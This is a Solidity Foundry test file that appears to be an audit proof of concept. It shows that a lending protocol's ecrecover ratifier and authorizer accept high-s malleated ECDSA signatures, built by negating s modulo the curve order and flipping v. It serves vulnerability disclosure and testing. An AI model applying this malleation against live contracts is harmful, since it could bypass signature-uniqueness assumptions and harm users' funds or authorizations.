// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.34;

import {Config} from "../Config.t.sol";
import {Offer, Market, CollateralParams} from "../../../src/interfaces/IMidnight.sol";
import {CALLBACK_SUCCESS, LLTV_4, WAD} from "../../../src/libraries/ConstantsLib.sol";
import {HashLib} from "../../../src/ratifiers/libraries/HashLib.sol";
import {Signature as RatifierSignature} from "../../../src/ratifiers/interfaces/IEcrecoverRatifier.sol";
import {
    Authorization,
    Signature as AuthorizationSignature,
    AUTHORIZATION_TYPEHASH,
    EIP712_DOMAIN_TYPEHASH as AUTHORIZER_DOMAIN_TYPEHASH
} from "../../../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract PoCSignatureMalleabilityTest is Config {
    uint256 internal constant SECP256K1_N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
    uint256 internal constant SECP256K1_HALF_N = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0;

    function testPoC_RatifierAcceptsHighSMalleatedSignature() public {
        Offer memory offer = _signedOffer(lender);
        bytes32 root = HashLib.hashOffer(offer);

        RatifierSignature memory original = signature(root, privateKey[lender], address(ecrecoverRatifier), 0);
        RatifierSignature memory malleated =
            RatifierSignature({v: _flipV(original.v), r: original.r, s: _malleatedS(original.s)});

        assertLe(uint256(original.s), SECP256K1_HALF_N, "test precondition: forge signature should be low-s");
        assertGt(uint256(malleated.s), SECP256K1_HALF_N, "malleated signature is high-s");

        bytes32[] memory proof = new bytes32[](0);
        bytes memory ratifierData = abi.encode(malleated, root, uint256(0), proof);

        vm.prank(address(midnight));
        bytes32 result = ecrecoverRatifier.isRatified(offer, ratifierData);

        assertEq(result, CALLBACK_SUCCESS, "ratifier accepted the alternate high-s signature");
    }

    function testPoC_AuthorizerAcceptsHighSMalleatedSignature() public {
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        Authorization memory authorization = Authorization({
            authorizer: borrower,
            authorized: makeAddr("malleatedAuthorizationTarget"),
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(borrower),
            deadline: block.timestamp + 1 days
        });

        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator =
            keccak256(abi.encode(AUTHORIZER_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[borrower], digest);
        AuthorizationSignature memory malleated = AuthorizationSignature({v: _flipV(v), r: r, s: _malleatedS(s)});

        assertLe(uint256(s), SECP256K1_HALF_N, "test precondition: forge signature should be low-s");
        assertGt(uint256(malleated.s), SECP256K1_HALF_N, "malleated signature is high-s");

        ecrecoverAuthorizer.setIsAuthorized(authorization, malleated);

        assertTrue(
            midnight.isAuthorized(authorization.authorizer, authorization.authorized),
            "authorizer accepted the alternate high-s signature"
        );
        assertEq(ecrecoverAuthorizer.nonce(borrower), authorization.nonce + 1);
    }

    function _signedOffer(address maker) internal view returns (Offer memory offer) {
        offer = _basicBuyOffer(maker, _defaultMarket());
        offer.maxUnits = 1;
        offer.ratifier = address(ecrecoverRatifier);
    }

    function _malleatedS(bytes32 s) internal pure returns (bytes32) {
        return bytes32(SECP256K1_N - uint256(s));
    }

    function _flipV(uint8 v) internal pure returns (uint8) {
        return v == 27 ? 28 : 27;
    }
}
